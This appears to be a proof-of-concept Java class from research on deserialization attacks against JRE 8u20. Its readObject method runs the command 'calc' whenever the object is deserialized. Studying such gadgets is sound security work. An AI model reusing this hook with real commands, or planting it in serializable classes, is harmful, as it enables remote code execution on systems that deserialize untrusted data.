package com.feihong.jre8u20;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Payload implements Serializable {
    public Payload() throws IOException {

    }

    private synchronized void readObject(ObjectInputStream ois) throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}
